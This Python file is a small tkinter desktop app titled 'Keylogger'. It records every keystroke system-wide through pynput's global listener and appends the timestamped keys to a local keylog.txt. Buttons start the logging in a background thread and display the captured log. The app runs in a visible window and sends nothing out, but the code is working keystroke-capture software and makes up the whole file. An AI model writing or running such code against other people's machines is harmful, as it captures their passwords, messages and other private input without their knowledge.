
from tkinter import *
from threading import Thread
from tracemalloc import start
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def extract_data():
    print(text_box.get('1.0', 'end'))

def on_press(key):
    logging.info(str(key))

def _start_keylogger():
    root.configure(bg='green')
    with Listener(on_press=on_press) as listener :
        listener.join()

def start_keylogger():
    new_thread = Thread(target=_start_keylogger, daemon=True)
    new_thread.start()

def open_log():
    f = open("keylog.txt", "r")
    message = f.read()
    frame = Frame(root)
    
    text_box = Text(
        frame,
        height=13,
        width=50,
        wrap='word'
    )
    text_box.insert('end', message)
    text_box.pack(side=LEFT,expand=True)
    
    
    sb = Scrollbar(frame)
    sb.pack(side=RIGHT, fill=BOTH)
    
    text_box.config(yscrollcommand=sb.set)
    sb.config(command=text_box.yview)
    
    frame.pack(expand=True)

root = Tk()
root.title("Keylogger")
root.geometry('500x400')
root.configure(bg='red')

p1 = PhotoImage(file = 'logo.png')
root.iconphoto(False, p1)

startbutton = Button(root, text="Start", 
                 command=start_keylogger)
startbutton.pack(side=TOP)



openlogbutton = Button(root, text="Display Log",
                 command=open_log)
openlogbutton.pack(side=TOP)


exitbutton = Button(root, text="Exit", command=root.quit)
exitbutton.pack(side=TOP)


root.mainloop()
